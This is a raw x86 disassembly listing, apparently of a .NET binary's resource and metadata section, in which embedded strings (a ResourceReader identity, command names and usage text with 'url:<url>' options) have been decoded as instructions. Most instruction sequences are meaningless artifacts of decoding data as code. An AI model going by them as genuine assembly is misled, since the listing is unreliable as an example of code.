  4033af:	or     dl,BYTE PTR [edi]
  4033b1:	lea    edx,[eax+eax*1+0x0]
  4033b5:	add    DWORD PTR [ebx],edx
  4033b7:	push   es
  4033b8:	adc    DWORD PTR [esi],eax
  4033ba:	push   ss
  4033bb:	pop    ds
  4033bc:	pop    esp
  4033bd:	popf   
  4033be:	adc    DWORD PTR [esi],eax
  4033c0:	outs   dx,DWORD PTR ds:[esi]
  4033c1:	jnp    0x4033c3
  4033c3:	add    BYTE PTR [edx],cl
  4033c5:	or     eax,DWORD PTR [edi]
  4033c7:	mov    gs,WORD PTR [ecx+0x18]
  4033ca:	das    
  4033cb:	add    dl,BYTE PTR [esi]
  4033cd:	sub    al,BYTE PTR [edi]
  4033cf:	push   ss
  4033d0:	call   0x80d:0x9a17070c
  4033d7:	or     DWORD PTR [edi],edx
  4033d9:	adc    al,BYTE PTR [eax]
  4033db:	sub    BYTE PTR [eax+0x0],ah
  4033de:	add    BYTE PTR [esi],al
  4033e0:	adc    eax,DWORD PTR [ecx+edx*1]
  4033e3:	add    al,0x2d
  4033e5:	add    eax,0xde051317
  4033ea:	adc    al,0x11
  4033ec:	add    al,0x1b
  4033ee:	xor    ecx,DWORD PTR [eax]
  4033f0:	add    edx,DWORD PTR [edi]
  4033f2:	push   edx
  4033f3:	pop    ss
  4033f4:	adc    eax,DWORD PTR ds:0x3de07de
  4033fa:	fiadd  WORD PTR es:[eax]
  4033fd:	push   ss
  4033fe:	sub    dl,BYTE PTR [ecx]
  403400:	add    eax,0x100002a
  403405:	adc    BYTE PTR [eax],al
  403407:	add    BYTE PTR [eax],al
  403409:	add    BYTE PTR [edx+0x0],al
  40340c:	and    al,0x66
  40340e:	add    BYTE PTR [ebx],al
  403410:	push   es
  403411:	add    BYTE PTR [eax],al
  403413:	add    DWORD PTR [ebx],ebx
  403415:	xor    BYTE PTR [ebx],al
  403417:	add    BYTE PTR [ebp+0x0],al
  40341a:	add    BYTE PTR [eax],al
  40341c:	sbb    DWORD PTR [eax],eax
  40341e:	add    BYTE PTR [ecx],dl
  403420:	add    dh,BYTE PTR [edx+0x5d]
  403423:	add    eax,0x6f1b7000
  403428:	jbe    0x40342a
  40342a:	add    BYTE PTR [edx],cl
  40342c:	sub    al,0x4
  40342e:	pop    ss
  40342f:	or     bl,dh
  403431:	xor    DWORD PTR [edx],eax
  403433:	jb     0x4033c8
  403435:	add    eax,0x6f1b7000
  40343a:	jbe    0x40343c
  40343c:	add    BYTE PTR [edx],cl
  40343e:	sub    al,0x4
  403440:	push   ss
  403441:	or     bl,dh
  403443:	pop    ds
  403444:	add    dh,BYTE PTR [edx-0x69]
  403447:	add    eax,0x266f7000
  40344c:	add    BYTE PTR [eax],al
  40344e:	or     ch,BYTE PTR [esp+eax*1]
  403451:	pop    ss
  403452:	or     bl,dh
  403454:	push   cs
  403455:	add    ch,BYTE PTR [eax]
  403457:	lea    eax,[eax]
  403459:	add    BYTE PTR [edx],cl
  40345b:	or     bl,dh
  40345d:	add    eax,0x1600de26
  403462:	sub    al,BYTE PTR [esi]
  403464:	sub    al,BYTE PTR [eax]
  403466:	add    BYTE PTR [eax],al
  403468:	add    DWORD PTR [eax],edx
  40346a:	add    BYTE PTR [eax],al
  40346c:	add    BYTE PTR [eax],al
  40346e:	add    BYTE PTR [eax],al
  403470:	ds add BYTE PTR ds:[ebx],al
  403474:	push   es
  403475:	add    BYTE PTR [eax],al
  403477:	add    DWORD PTR [ebx],edx
  403479:	xor    BYTE PTR [eax+eax*1],al
  40347c:	int3   
  40347d:	add    BYTE PTR [eax],al
  40347f:	add    BYTE PTR [ebx],bl
  403481:	add    BYTE PTR [eax],al
  403483:	adc    DWORD PTR ds:0x137e,eax
  403489:	or     dl,BYTE PTR [ecx+0xe]
  40348c:	add    al,0x16
  40348e:	push   edx
  40348f:	push   cs
  403490:	add    eax,0x60e5216
  403495:	push   ss
  403496:	push   edx
  403497:	add    ch,BYTE PTR [eax]
  403499:	xor    eax,DWORD PTR [eax]
  40349b:	add    BYTE PTR [edx],cl
  40349d:	sub    al,0x2
  40349f:	pop    ss
  4034a0:	sub    al,BYTE PTR [edx]
  4034a2:	outs   dx,DWORD PTR ds:[esi]
  4034a3:	add    BYTE PTR [bx+si],al
  4034a6:	or     cl,BYTE PTR [edx]
  4034a8:	push   es
  4034a9:	sub    BYTE PTR [ebx],dh
  4034ab:	add    BYTE PTR [eax],al
  4034ad:	or     ch,BYTE PTR [edx+eax*1]
  4034b0:	pop    ss
  4034b1:	sub    ch,BYTE PTR [eax]
  4034b3:	mov    es,WORD PTR [eax]
  4034b5:	add    BYTE PTR [edx],cl
  4034b7:	or     eax,DWORD PTR [edi]
  4034b9:	mov    gs,WORD PTR [ecx+0x18]
  4034bc:	pop    eax
  4034bd:	lea    edx,[eax+eax*1+0x0]
  4034c1:	add    DWORD PTR [edi+eax*1],ecx
  4034c4:	or     BYTE PTR [esi],dl
  4034c6:	outs   dx,DWORD PTR ds:[esi]
  4034c7:	pop    DWORD PTR [eax]
  4034c9:	add    BYTE PTR [edx],cl
  4034cb:	pop    es
  4034cc:	mov    gs,WORD PTR [ecx+0xd]
  4034cf:	or     BYTE PTR [ecx],cl
  4034d1:	and    eax,0x1f0d5817
  4034d6:	sub    bl,BYTE PTR [ebp+0x17250908]
  4034dc:	pop    eax
  4034dd:	or     eax,0x69d3f1f
  4034e2:	or     BYTE PTR [edi-0x70],ch
  4034e5:	add    BYTE PTR [eax],al
  4034e7:	or     dl,BYTE PTR ds:0x605122e
  4034ed:	push   es
  4034ee:	or     BYTE PTR [edi-0x70],ch
  4034f1:	add    BYTE PTR [eax],al
  4034f3:	or     dl,BYTE PTR [edi]
  4034f5:	outs   dx,DWORD PTR ds:[esi]
  4034f6:	jo     0x4034f8
  4034f8:	add    BYTE PTR [edx],cl
  4034fa:	push   ecx
  4034fb:	push   ss
  4034fc:	sub    al,BYTE PTR [ebx]
  4034fe:	sub    eax,0x97720613
  403503:	add    eax,0x266f7000
  403508:	add    BYTE PTR [eax],al
  40350a:	or     ch,BYTE PTR [esi+eax*1]
  40350d:	push   cs
  40350e:	add    al,0x17
  403510:	push   edx
  403511:	push   ss
  403512:	sub    al,BYTE PTR [ebp*1+0x5d720614]
  403519:	add    eax,0x6f1b7000
  40351e:	jbe    0x403520
  403520:	add    BYTE PTR [edx],cl
  403522:	sub    al,0x6
  403524:	push   cs
  403525:	add    eax,0x2a165217
  40352a:	add    al,0x2c
  40352c:	and    DWORD PTR [esi],eax
  40352e:	jb     0x40358d
  403530:	add    eax,0x6f1b7000
  403535:	jbe    0x403537
  403537:	add    BYTE PTR [edx],cl
  403539:	sub    al,0x13
  40353b:	push   es
  40353c:	jb     0x4034d9
  40353e:	add    eax,0x91287000
  403543:	add    BYTE PTR [eax],al
  403545:	or     ch,BYTE PTR ds:0x17060e06
  40354b:	push   edx
  40354c:	push   ss
  40354d:	sub    dl,BYTE PTR [edi]
  40354f:	sub    dl,BYTE PTR [ebx]
  403551:	xor    BYTE PTR [eax+eax*1],al
  403554:	inc    eax
  403555:	add    BYTE PTR [eax],al
  403557:	add    BYTE PTR [eax+eax*1],bl
  40355a:	add    BYTE PTR [ecx],dl
  40355c:	add    edi,DWORD PTR [esi+0x13]
  40355f:	add    BYTE PTR [eax],al
  403561:	or     dl,BYTE PTR [ecx+0x2]
  403564:	sub    BYTE PTR [ebx],dh
  403566:	add    BYTE PTR [eax],al
  403568:	or     ch,BYTE PTR [edx+eax*1]
  40356b:	pop    ss
  40356c:	sub    al,BYTE PTR [edx]
  40356e:	outs   dx,DWORD PTR ds:[esi]
  40356f:	add    BYTE PTR [bx+si],al
  403572:	or     cl,BYTE PTR [edx]
  403574:	push   es
  403575:	sub    BYTE PTR [ebx],dh
  403577:	add    BYTE PTR [eax],al
  403579:	or     ch,BYTE PTR [edx+eax*1]
  40357c:	pop    ss
  40357d:	sub    al,BYTE PTR [esi]
  40357f:	sub    BYTE PTR [edx+0x6f0a0000],dl
  403585:	nop
  403586:	add    BYTE PTR [eax],al
  403588:	or     cl,BYTE PTR [ebx]
  40358a:	pop    es
  40358b:	adc    eax,0x6030c2e
  403590:	pop    es
  403591:	pop    ss
  403592:	outs   dx,DWORD PTR ds:[esi]
  403593:	jo     0x403595
  403595:	add    BYTE PTR [edx],cl
  403597:	push   ecx
  403598:	push   ss
  403599:	sub    dl,BYTE PTR [edi]
  40359b:	sub    dl,BYTE PTR [ebx]
  40359d:	xor    BYTE PTR [eax+eax*1],al
  4035a0:	jns    0x4035a2
  4035a2:	add    BYTE PTR [eax],al
  4035a4:	sbb    eax,0x2110000
  4035a9:	outs   dx,DWORD PTR ds:[esi]
  4035aa:	je     0x4035ac
  4035ac:	add    BYTE PTR [edx],cl
  4035ae:	outs   dx,DWORD PTR ds:[esi]
  4035af:	add    BYTE PTR [bx+si],al
  4035b2:	or     cl,BYTE PTR [edx]
  4035b4:	push   es
  4035b5:	sub    BYTE PTR [ebx],dh
  4035b7:	add    BYTE PTR [eax],al
  4035b9:	or     ch,BYTE PTR [edx+eax*1]
  4035bc:	pop    ss
  4035bd:	sub    al,BYTE PTR [esi]
  4035bf:	jb     0x403580
  4035c1:	add    eax,0x6f1b7000
  4035c6:	jbe    0x4035c8
  4035c8:	add    BYTE PTR [edx],cl
  4035ca:	sub    eax,0x62a1602
  4035cf:	pop    ss
  4035d0:	outs   dx,DWORD PTR ds:[esi]
  4035d1:	jg     0x4035d3
  4035d3:	add    BYTE PTR [edx],cl
  4035d5:	or     al,BYTE PTR [esi]
  4035d7:	pop    ss
  4035d8:	lea    edx,[eax+eax*1+0x0]
  4035dc:	add    DWORD PTR [ebx],edx
  4035de:	add    al,0x11
  4035e0:	add    al,0x16
  4035e2:	pop    ds
  4035e3:	cs popf 
  4035e5:	adc    DWORD PTR [edi+ebp*2],eax
  4035e8:	jnp    0x4035ea
  4035ea:	add    BYTE PTR [edx],cl
  4035ec:	or     eax,DWORD PTR [edi]
  4035ee:	sub    al,0x6
  4035f0:	pop    es
  4035f1:	mov    gs,WORD PTR [ecx+0x18]
  4035f4:	add    dl,BYTE PTR cs:[esi]
  4035f7:	sub    dl,BYTE PTR [esi]
  4035f9:	or     al,0x16
  4035fb:	or     eax,0x129a1607
  403600:	add    ch,BYTE PTR [eax]
  403602:	xchg   ebx,eax
  403603:	add    BYTE PTR [eax],al
  403605:	or     ch,BYTE PTR [esp+ecx*1]
  403608:	pop    es
  403609:	pop    ss
  40360a:	call   0x0:0x93280312
  403611:	or     ch,BYTE PTR ds:0x82a1602
  403617:	pop    ss
  403618:	xor    eax,DWORD PTR ds:0x16022d09
  40361e:	sub    dl,BYTE PTR [edi]
  403620:	sub    al,BYTE PTR [eax]
  403622:	add    BYTE PTR [eax],al
  403624:	sbb    esi,DWORD PTR [eax]
  403626:	pop    es
  403627:	add    BYTE PTR [ebp+0x1e000000],al
  40362d:	add    BYTE PTR [eax],al
  40362f:	adc    DWORD PTR ds:0x137e,eax
  403635:	or     dl,BYTE PTR [ecx+0xe]
  403638:	add    al,0x16
  40363a:	push   edx
  40363b:	push   cs
  40363c:	add    eax,0x60e5216
  403641:	push   ss
  403642:	push   edx
  403643:	add    ch,BYTE PTR [eax]
  403645:	xchg   esp,eax
  403646:	add    BYTE PTR [eax],al
  403648:	or     al,BYTE PTR ds:0x5d28
  40364e:	push   es
  40364f:	sub    eax,0xde0c1604
  403654:	pop    esi
  403655:	jle    0x40366a
  403657:	add    BYTE PTR [eax],al
  403659:	or     cl,BYTE PTR [edx]
  40365b:	add    dh,BYTE PTR [edx+0x5d]
  40365e:	add    eax,0x6f1b7000
  403663:	jbe    0x403665
  403665:	add    BYTE PTR [edx],cl
  403667:	sub    al,0x19
  403669:	add    bh,BYTE PTR [esi-0x6b]
  40366c:	add    BYTE PTR [eax],al
  40366e:	or     ch,BYTE PTR [edi-0x6a]
  403671:	add    BYTE PTR [eax],al
  403673:	or     cl,BYTE PTR [ebx]
  403675:	add    dl,BYTE PTR [esi]
  403677:	pop    es
  403678:	pop    ss
  403679:	pop    eax
  40367a:	outs   dx,DWORD PTR ds:[esi]
  40367b:	jo     0x40367d
  40367d:	add    BYTE PTR [edx],cl
  40367f:	or     ch,BYTE PTR [ebx]
  403681:	pop    es
  403682:	add    ch,BYTE PTR [eax]
  403684:	cmp    BYTE PTR [eax],al
  403686:	add    BYTE PTR [edx],cl
  403688:	or     al,BYTE PTR [esi]
  40368a:	sub    BYTE PTR [ebx],dh
  40368c:	add    BYTE PTR [eax],al
  40368e:	or     ch,BYTE PTR [esp+eax*1]
  403691:	push   ss
  403692:	or     al,0xde
  403694:	push   ds
  403695:	push   es
  403696:	add    eax,DWORD PTR [eax*1+0x50e040e]
  40369d:	push   cs
  40369e:	push   es
  40369f:	sub    BYTE PTR [eax+eax*1+0x0],bl
  4036a3:	push   es
  4036a4:	sub    eax,0xde0c1604
  4036a9:	or     esi,ebx
  4036ab:	add    eax,0xde0c1626
  4036b0:	add    dl,BYTE PTR [edi]
  4036b2:	sub    cl,BYTE PTR [eax]
  4036b4:	sub    al,BYTE PTR [eax]
  4036b6:	add    BYTE PTR [eax],al
  4036b8:	add    DWORD PTR [eax],edx
  4036ba:	add    BYTE PTR [eax],al
  4036bc:	add    BYTE PTR [eax],al
  4036be:	adc    eax,DWORD PTR [eax]
  4036c0:	imul   edi,DWORD PTR [eax+eax*1+0x5],0x1000006
  4036c8:	push   ds
  4036c9:	add    ch,BYTE PTR [eax]
  4036cb:	adc    al,0x0
  4036cd:	add    BYTE PTR [edx],cl
  4036cf:	sub    dh,BYTE PTR [ebx-0x31fffffa]
  4036d5:	retf   0xbeef
  4036d8:	add    DWORD PTR [eax],eax
  4036da:	add    BYTE PTR [eax],al
  4036dc:	xchg   ecx,eax
  4036dd:	add    BYTE PTR [eax],al
  4036df:	add    BYTE PTR [ebx+edx*2+0x79],ch
  4036e3:	jae    0x403759
  4036e5:	gs ins DWORD PTR es:[edi],dx
  4036e7:	cs push edx
  4036e9:	gs jae 0x40375b
  4036ec:	jne    0x403760
  4036ee:	arpl   WORD PTR [ebp+0x73],sp
  4036f1:	cs push edx
  4036f3:	gs jae 0x403765
  4036f6:	jne    0x40376a
  4036f8:	arpl   WORD PTR [ebp+0x52],sp
  4036fb:	gs popa 
  4036fd:	fs gs jb 0x40372d
  403701:	and    BYTE PTR [ebp+0x73],ch
  403704:	arpl   WORD PTR [edi+0x72],bp
  403707:	ins    BYTE PTR es:[edi],dx
  403708:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  40370f:	jae    0x40377a
  403711:	outs   dx,DWORD PTR ds:[esi]
  403712:	outs   dx,BYTE PTR ds:[esi]
  403713:	cmp    eax,0x2e302e32
  403718:	xor    BYTE PTR [esi],ch
  40371a:	xor    BYTE PTR [eax+eiz*1],ch
  40371d:	inc    ebx
  40371e:	jne    0x40378c
  403720:	je     0x403797
  403722:	jb     0x403789
  403724:	cmp    eax,0x7475656e
  403729:	jb     0x40378c
  40372b:	ins    BYTE PTR es:[edi],dx
  40372c:	sub    al,0x20
  40372e:	push   eax
  40372f:	jne    0x403793
  403731:	ins    BYTE PTR es:[edi],dx
  403732:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403739:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  40373d:	bound  esi,QWORD PTR [edi]
  40373f:	aaa    
  403740:	popa   
  403741:	xor    eax,0x31363563
  403746:	cmp    DWORD PTR [ebx],esi
  403748:	xor    al,0x65
  40374a:	xor    BYTE PTR [eax],bh
  40374c:	cmp    DWORD PTR [ebx],esp
  40374e:	push   ebx
  40374f:	jns    0x4037c4
  403751:	je     0x4037b8
  403753:	ins    DWORD PTR es:[edi],dx
  403754:	cs push edx
  403756:	gs jae 0x4037c8
  403759:	jne    0x4037cd
  40375b:	arpl   WORD PTR [ebp+0x73],sp
  40375e:	cs push edx
  403760:	jne    0x4037d0
  403762:	je     0x4037cd
  403764:	ins    DWORD PTR es:[edi],dx
  403765:	gs push edx
  403767:	gs jae 0x4037d9
  40376a:	jne    0x4037de
  40376c:	arpl   WORD PTR [ebp+0x53],sp
  40376f:	gs je  0x403774
  403772:	add    BYTE PTR [eax],al
  403774:	add    BYTE PTR [edx],cl
  403776:	add    BYTE PTR [eax],al
  403778:	add    BYTE PTR [eax],al
  40377a:	add    BYTE PTR [eax],al
  40377c:	add    BYTE PTR [eax+0x41],dl
  40377f:	inc    esp
  403780:	push   eax
  403781:	inc    ecx
  403782:	inc    esp
  403783:	push   eax
  403784:	mov    bh,0xce
  403786:	adc    al,0x95
  403788:	(bad)  
  403789:	xor    esi,DWORD PTR [ebx+ebx*4-0x553771c7]
  403790:	test   ch,bh
  403792:	jno    0x40374a
  403794:	add    dh,al
  403796:	jmp    0xfde3:0xa5e96de
  40379d:	mov    dh,0x71
  40379f:	call   0x2cf8a157
  4037a4:	retf   0x49a5
  4037a7:	pop    edi
  4037a8:	jae    0x4037fb
  4037aa:	mov    BYTE PTR [ecx-0x6],bh
  4037ad:	add    BYTE PTR [eax],al
  4037af:	add    BYTE PTR [eax],al
  4037b1:	add    BYTE PTR [eax],al
  4037b3:	add    BYTE PTR [ecx],ch
  4037b5:	add    DWORD PTR [eax],eax
  4037b7:	add    BYTE PTR [eax+0x5a000000],ch
  4037bd:	add    DWORD PTR [eax],eax
  4037bf:	add    BYTE PTR [edi+0x25000001],cl
  4037c5:	add    BYTE PTR [eax],al
  4037c7:	add    cl,bl
  4037c9:	add    BYTE PTR [eax],al
  4037cb:	add    BYTE PTR [eax+0x0],cl
  4037ce:	add    BYTE PTR [eax],al
  4037d0:	jnp    0x4037d2
  4037d2:	add    BYTE PTR [eax],al
  4037d4:	mov    esp,0x20000002
  4037d9:	inc    ebx
  4037da:	add    BYTE PTR [edi+0x0],ch
  4037dd:	ins    DWORD PTR es:[edi],dx
  4037de:	add    BYTE PTR [ebp+0x0],ch
  4037e1:	popa   
  4037e2:	add    BYTE PTR [esi+0x0],ch
  4037e5:	add    BYTE PTR fs:[ebx+0x0],al
  4037e9:	outs   dx,DWORD PTR ds:[esi]
  4037ea:	add    BYTE PTR [ebp+0x0],ch
  4037ed:	jo     0x4037ef
  4037ef:	ins    BYTE PTR es:[edi],dx
  4037f0:	add    BYTE PTR [ebp+0x0],ah
  4037f3:	je     0x4037f5
  4037f5:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  4037fa:	add    BYTE PTR [eax],al
  4037fc:	add    BYTE PTR [esi],bl
  4037fe:	inc    ebx
  4037ff:	add    BYTE PTR [edi+0x0],ch
  403802:	ins    DWORD PTR es:[edi],dx
  403803:	add    BYTE PTR [ebp+0x0],ch
  403806:	popa   
  403807:	add    BYTE PTR [esi+0x0],ch
  40380a:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  40380f:	add    BYTE PTR [esi+0x0],ch
  403812:	add    BYTE PTR gs:[eax+0x0],cl
  403816:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40381b:	add    BYTE PTR [edx],bl
  40381d:	add    BYTE PTR [eax],al
  40381f:	add    BYTE PTR [esi],ch
  403821:	inc    ebx
  403822:	add    BYTE PTR [edi+0x0],ch
  403825:	ins    DWORD PTR es:[edi],dx
  403826:	add    BYTE PTR [ebp+0x0],ch
  403829:	popa   
  40382a:	add    BYTE PTR [esi+0x0],ch
  40382d:	add    BYTE PTR fs:[eax+0x0],dl
  403831:	jb     0x403833
  403833:	outs   dx,DWORD PTR ds:[esi]
  403834:	add    BYTE PTR [ebx+0x0],ah
  403837:	add    BYTE PTR gs:[ebx+0x0],dh
  40383b:	jae    0x40383d
  40383d:	imul   eax,DWORD PTR [eax],0x67006e
  403843:	inc    esi
  403844:	add    BYTE PTR [ecx+0x0],ah
  403847:	imul   eax,DWORD PTR [eax],0x65006c
  40384d:	add    BYTE PTR fs:[esi+0x28000002],dh
  403854:	inc    esp
  403855:	add    BYTE PTR [esi+0x0],ch
  403858:	jae    0x40385a
  40385a:	dec    esi
  40385b:	add    BYTE PTR [ecx+0x0],ah
  40385e:	ins    DWORD PTR es:[edi],dx
  40385f:	add    BYTE PTR [ebp+0x0],ah
  403862:	jae    0x403864
  403864:	dec    esi
  403865:	add    BYTE PTR [edi+0x0],ch
  403868:	je     0x40386a
  40386a:	push   ebx
  40386b:	add    BYTE PTR [ebp+0x0],dh
  40386e:	jo     0x403870
  403870:	jo     0x403872
  403872:	outs   dx,DWORD PTR ds:[esi]
  403873:	add    BYTE PTR [edx+0x0],dh
  403876:	je     0x403878
  403878:	add    BYTE PTR gs:[eax+eax*1-0x33],ah
  40387d:	add    al,BYTE PTR [eax]
  40387f:	add    BYTE PTR [eax*2+0x72007200],ch
  403886:	add    BYTE PTR [edi+0x0],ch
  403889:	jb     0x40388b
  40388b:	push   edx
  40388c:	add    BYTE PTR [ebp+0x0],ah
  40388f:	jno    0x403891
  403891:	jne    0x403893
  403893:	imul   eax,DWORD PTR [eax],0x650072
  403899:	jae    0x40389b
  40389b:	inc    ebp
  40389c:	add    BYTE PTR [eax+eax*1+0x65],ch
  4038a0:	add    BYTE PTR [esi+0x0],dh
  4038a3:	popa   
  4038a4:	add    BYTE PTR [eax+eax*1+0x69],dh
  4038a8:	add    BYTE PTR [edi+0x0],ch
  4038ab:	outs   dx,BYTE PTR ds:[esi]
  4038ac:	add    BYTE PTR [ebx],al
  4038ae:	add    eax,DWORD PTR [eax]
  4038b0:	add    BYTE PTR [ecx+ecx*2],bl
  4038b3:	add    BYTE PTR [esi+0x0],ch
  4038b6:	jbe    0x4038b8
  4038b8:	popa   
  4038b9:	add    BYTE PTR [eax+eax*1+0x69],ch
  4038bd:	add    BYTE PTR [eax+eax*1+0x43],ah
  4038c1:	add    BYTE PTR [edi+0x0],ch
  4038c4:	ins    DWORD PTR es:[edi],dx
  4038c5:	add    BYTE PTR [ebp+0x0],ch
  4038c8:	popa   
  4038c9:	add    BYTE PTR [esi+0x0],ch
  4038cc:	add    BYTE PTR fs:[edi+0x3],al
  4038d0:	add    BYTE PTR [eax],al
  4038d2:	sub    dl,BYTE PTR [eax+0x0]
  4038d5:	popa   
  4038d6:	add    BYTE PTR [edx+0x0],dh
  4038d9:	popa   
  4038da:	add    BYTE PTR [ebp+0x0],ch
  4038dd:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4038e2:	add    BYTE PTR [edx+0x0],dh
  4038e5:	push   ebp
  4038e6:	add    BYTE PTR [esi+0x0],ch
  4038e9:	jb     0x4038eb
  4038eb:	add    BYTE PTR gs:[ebx+0x0],ah
  4038ef:	outs   dx,DWORD PTR ds:[esi]
  4038f0:	add    BYTE PTR [edi+0x0],ah
  4038f3:	outs   dx,BYTE PTR ds:[esi]
  4038f4:	add    BYTE PTR [ecx+0x0],ch
  4038f7:	jp     0x4038f9
  4038f9:	add    BYTE PTR gs:[eax+eax*1+0x60],ah
  4038fe:	add    eax,DWORD PTR [eax]
  403900:	add    BYTE PTR [eax+edx*2],ch
  403903:	add    BYTE PTR [ecx+0x0],ah
  403906:	jb     0x403908
  403908:	popa   
  403909:	add    BYTE PTR [ebp+0x0],ch
  40390c:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  403911:	add    BYTE PTR [edx+0x0],dh
  403914:	push   esi
  403915:	add    BYTE PTR [ecx+0x0],ah
  403918:	ins    BYTE PTR es:[edi],dx
  403919:	add    BYTE PTR [ebp+0x0],dh
  40391c:	add    BYTE PTR gs:[ebp+0x0],al
  403920:	js     0x403922
  403922:	jo     0x403924
  403924:	add    BYTE PTR gs:[ebx+0x0],ah
  403928:	je     0x40392a
  40392a:	add    BYTE PTR gs:[eax+eax*1+0x79],ah
  40392f:	add    eax,DWORD PTR [eax]
  403931:	add    BYTE PTR [eax],dh
  403933:	push   eax
  403934:	add    BYTE PTR [ecx+0x0],ah
  403937:	jb     0x403939
  403939:	popa   
  40393a:	add    BYTE PTR [ebp+0x0],ch
  40393d:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  403942:	add    BYTE PTR [edx+0x0],dh
  403945:	push   esi
  403946:	add    BYTE PTR [ecx+0x0],ah
  403949:	ins    BYTE PTR es:[edi],dx
  40394a:	add    BYTE PTR [ebp+0x0],dh
  40394d:	add    BYTE PTR gs:[ebp+0x0],dl
  403951:	outs   dx,BYTE PTR ds:[esi]
  403952:	add    BYTE PTR [ebp+0x0],ah
  403955:	js     0x403957
  403957:	jo     0x403959
  403959:	add    BYTE PTR gs:[ebx+0x0],ah
  40395d:	je     0x40395f
  40395f:	add    BYTE PTR gs:[eax+eax*1-0x69],ah
  403964:	add    eax,DWORD PTR [eax]
  403966:	add    BYTE PTR [ebx+edx*2],ah
  403969:	add    BYTE PTR [ebp+0x0],dh
  40396c:	add    BYTE PTR [bx+0x0],ah
  403970:	add    BYTE PTR gs:[ebx+0x0],dh
  403974:	je     0x403976
  403976:	dec    ebp
  403977:	add    BYTE PTR [edi+0x0],ch
  40397a:	jb     0x40397c
  40397c:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  403981:	add    BYTE PTR [eax+eax*1+0x61],dh
  403985:	add    BYTE PTR [ecx+0x0],ch
  403988:	ins    BYTE PTR es:[edi],dx
  403989:	add    BYTE PTR [ebx+0x0],dh
  40398c:	ret    
  40398d:	add    eax,DWORD PTR [eax]
  40398f:	add    BYTE PTR [ecx],al
  403991:	sbb    BYTE PTR [ebx+0x6f],al
  403994:	ins    DWORD PTR es:[edi],dx
  403995:	ins    DWORD PTR es:[edi],dx
  403996:	popa   
  403997:	outs   dx,BYTE PTR ds:[esi]
  403998:	and    BYTE PTR fs:[edi],ah
  40399b:	jnp    0x4039cd
  40399d:	jge    0x4039c6
  40399f:	and    BYTE PTR [ebx+0x6f],ah
  4039a2:	ins    DWORD PTR es:[edi],dx
  4039a3:	jo     0x403a11
  4039a5:	gs je  0x403a0d
  4039a8:	fs add DWORD PTR cs:[ecx+0x61735505],ebx
  4039b0:	cmp    ah,BYTE PTR gs:[bx+si]
  4039b4:	imul   ebp,DWORD PTR [ecx+0x73],0x72707865
  4039bb:	gs jae 0x403a31
  4039be:	popa   
  4039bf:	fs ins DWORD PTR es:[edi],dx
  4039c1:	imul   ebp,DWORD PTR [esi+0x63],0x652e646d
  4039c8:	js     0x403a2f
  4039ca:	and    BYTE PTR [ebx+eiz*2],bh
  4039cd:	outs   dx,DWORD PTR ds:[esi]
  4039ce:	ins    DWORD PTR es:[edi],dx
  4039cf:	ins    DWORD PTR es:[edi],dx
  4039d0:	popa   
  4039d1:	outs   dx,BYTE PTR ds:[esi]
  4039d2:	fs and BYTE PTR ds:[eax+esi*2],bh
  4039d7:	popa   
  4039d8:	jb     0x403a3b
  4039da:	ins    DWORD PTR es:[edi],dx
  4039db:	gs je  0x403a43
  4039de:	jb     0x403a53
  4039e0:	ds or  eax,0x7075530a
  4039e6:	jo     0x403a57
  4039e8:	jb     0x403a5e
  4039ea:	gs and BYTE PTR fs:[ebx+0x6f],ah
  4039ef:	ins    DWORD PTR es:[edi],dx
  4039f0:	ins    DWORD PTR es:[edi],dx
  4039f1:	popa   
  4039f2:	outs   dx,BYTE PTR ds:[esi]
  4039f3:	fs jae 0x403a30
  4039f6:	and    BYTE PTR ds:0x2020200a,cl
  4039fc:	and    BYTE PTR [eax],ah
  4039fe:	and    BYTE PTR [ebx+0x65],dh
  403a01:	je     0x403a78
  403a03:	jo     0x403a4b
  403a05:	jb     0x403a70
  403a07:	outs   dx,BYTE PTR gs:[esi]
  403a09:	fs ins BYTE PTR es:[edi],dx
  403a0b:	jns    0x403a55
  403a0d:	outs   dx,DWORD PTR ds:[esi]
  403a0e:	jae    0x403a84
  403a10:	outs   dx,BYTE PTR ds:[esi]
  403a11:	popa   
  403a12:	ins    DWORD PTR es:[edi],dx
  403a13:	gs push ebp
  403a15:	jb     0x403a83
  403a17:	and    BYTE PTR ds:0x3a6c7275,ch
  403a1d:	cmp    al,0x75
  403a1f:	jb     0x403a8d
  403a21:	and    BYTE PTR ds:0x2020200a,cl
  403a28:	and    BYTE PTR [eax],ah
  403a2a:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  403a2e:	gs je  0x403a96
  403a31:	inc    esi
  403a32:	jb     0x403a9d
  403a34:	outs   dx,BYTE PTR gs:[esi]
  403a36:	fs ins BYTE PTR es:[edi],dx
  403a38:	jns    0x403a82
  403a3a:	outs   dx,DWORD PTR ds:[esi]
  403a3b:	jae    0x403ab1
  403a3d:	outs   dx,BYTE PTR ds:[esi]
  403a3e:	popa   
  403a3f:	ins    DWORD PTR es:[edi],dx
  403a40:	gs push ebp
  403a42:	jb     0x403ab0
  403a44:	and    BYTE PTR ds:0x3a6c7275,ch
  403a4a:	cmp    al,0x75
  403a4c:	jb     0x403aba
  403a4e:	ds or  eax,0x2020200a
  403a54:	and    BYTE PTR [eax],ah
  403a56:	and    BYTE PTR [ebx+0x65],dh
  403a59:	je     0x403ad0
  403a5b:	jo     0x403ab2
  403a5d:	jb     0x403acb
  403a5f:	and    BYTE PTR ds:0x3a6c7275,ch
  403a65:	cmp    al,0x75
  403a67:	jb     0x403ad5
  403a69:	ds or  eax,0x2020200a
  403a6f:	and    BYTE PTR [eax],ah
  403a71:	and    BYTE PTR [ebp+eiz*2+0x6c],ah
  403a75:	gs je  0x403add
  403a78:	push   ebp
  403a79:	jb     0x403ae7
  403a7b:	and    BYTE PTR ds:0x3a6c7275,ch
  403a81:	cmp    al,0x75
  403a83:	jb     0x403af1
  403a85:	ds or  eax,0x2020200a
  403a8b:	and    BYTE PTR [eax],ah
  403a8d:	and    BYTE PTR [ebx+0x65],dh
  403a90:	je     0x403b07
  403a92:	jo     0x403ae7
  403a94:	jae    0x403b02
  403a96:	push   ebp
